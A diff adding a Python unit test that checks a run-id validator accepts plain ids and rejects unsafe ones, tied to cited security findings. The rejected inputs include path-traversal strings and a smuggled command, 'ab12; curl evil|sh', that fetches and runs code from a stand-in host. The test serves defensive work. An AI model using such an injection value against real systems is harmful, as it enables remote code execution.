@@ -727,3 +727,33 @@ async def test_create_human_gate_puts_the_actions_in_the_description() -> None:
     gate = await client.task_get(task_id=gate_id)
     assert gate is not None and gate.description is not None
     assert "complete the STORY if the work landed" in gate.description
+
+
+def test_is_plain_run_id_is_the_one_rule_for_both_sinks() -> None:
+    """A run id is published as a shell command AND joined onto a path.
+
+    security/f-003 pinned the first sink, security/f-001 the second (the slice-C
+    resume path joins the marker's run id onto the work dir). One predicate, so a
+    new consumer cannot pick up only half of it.
+    """
+    from lithos_loom.gates import is_plain_run_id
+
+    for good in ("1a2b3c4d", "run.1", "run_id-2", "x" * 64):
+        assert is_plain_run_id(good) is True, good
+    # NB `.` / `..` match the handle rule (a run id may carry a dot, and the
+    # `pattern` in docs/result-schema.json says the same thing) — what stops
+    # them at the path sink is the containment check beside the join, which is
+    # why the resume path has both.
+    for bad in (
+        "",
+        None,
+        "a/b",
+        "../task-9/dead",
+        "/tmp/evil",
+        "~/evil",
+        "ab12; curl evil|sh",
+        "r 1",
+        "x" * 65,
+        "run\nid",
+    ):
+        assert is_plain_run_id(bad) is False, bad
